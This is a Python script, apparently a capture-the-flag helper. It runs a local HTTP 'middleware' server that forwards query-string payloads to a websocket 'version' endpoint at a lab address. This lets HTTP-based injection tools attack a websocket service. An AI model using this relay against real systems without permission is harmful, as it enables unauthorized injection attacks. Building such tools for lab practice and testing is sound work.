from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import urlparse
from websocket import create_connection
import json, webbrowser

ws_server = "ws://10.10.11.206:5789/version"

def sendPayloads(payload):
	ws = create_connection(ws_server)
    
	request = {"version": payload}
	ws.send(json.dumps(request))
    
	response = ws.recv()
	ws.close()

	if response:return response
	else:return None

class app:

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self, content_type="text/plain") -> None:
			self.send_response(200)

			try:payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:payload = None

			if payload:content = sendPayloads(payload)
			else:content = 'No payloads specified.'

			self.send_header("Content-type", content_type)
			self.end_headers()

			self.wfile.write(content.encode())
			
			return
 
	def MiddleWareServer(host_port, content_type="text/plain"):

		page = f"http://{host_port[0]}:{host_port[1]}"
		
		print("[✓] Starting MiddleWare Server")
		try:httpd = app._TCPServer(host_port, app.CustomHandler)
		except Exception as e:print("[✗]E: ", e)

		print(f"[✓] Server started in {page}/")

		print(f"[Info] Send payloads in {page}/?id=!payloads")
		print(f"[Info] Opening Server in Browser")
		webbrowser.open(f"{page}/?id=0.0.2")

		httpd.serve_forever()

	class _TCPServer(TCPServer):
		allow_reuse_address = True
	
if __name__ == '__main__':
	try:app.MiddleWareServer(('127.0.0.1', 1014))
	except KeyboardInterrupt:pass